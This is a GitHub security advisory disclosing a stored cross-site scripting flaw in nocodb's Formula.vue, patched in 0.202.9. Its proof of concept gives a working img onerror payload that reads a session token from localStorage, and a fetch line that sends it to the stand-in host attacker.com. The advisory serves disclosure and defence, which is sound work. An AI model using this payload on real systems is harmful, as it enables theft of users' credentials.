# Stored Cross-Site Scripting in Formula.vue in nocodb

High

[mertmit](/mertmit)
published
GHSA-h6r4-xvw6-jc5h
May 13, 2024

## Package

npm

nocodb/packages/nc-gui
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

<0.202.8

## Patched versions

0.202.9

## Description

### Summary

A stored cross-site scripting vulnerability exists within the Formula virtual cell comments functionality.

### Details

The nc-gui/components/virtual-cell/Formula.vue displays a v-html tag with the value of "urls" whose contents are processed by the function replaceUrlsWithLink(). This function recognizes the pattern URI::(XXX) and creates a hyperlink tag with href=XXX. However, it leaves all the other contents outside of the pattern URI::(XXX) unchanged, which makes the evil users can create a malicious table with a formula field whose payload is <img src=1 onerror="malicious javascripts"URI::(XXX). The evil users then can share this table with others by enabling public viewing and the victims who open the shared link can be attacked.

### PoC

Step 1: Attacker login the nocodb and creates a table with two fields, "T" and "F". The type of field "T" is "SingleLineText", and the type of the "F" is "Fomula" with the formula content {T}

Step 2: The attacker sets the contents of T using <img src=1 onerror=alert(localStorage.getItem('nocodb-gui-v2'))URI::(XXX)

Step 3: The attacker clicks the "Share" button and enables public viewing, then copies the shared link and sends it to the victims

Step 4: Any victims who open the shared link in their browsers will see the alert with their confidential tokens stored in localStorage

The attackers can use the fetch([http://attacker.com/?localStorage.getItem('nocodb-gui-v2')](http://attacker.com/?localStorage.getItem(%27nocodb-gui-v2%27))) to replace the alert and then steal the victims' credentials in their attacker.com website.

### Impact

Stealing the credentials of NocoDB user that clicks the malicious link.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
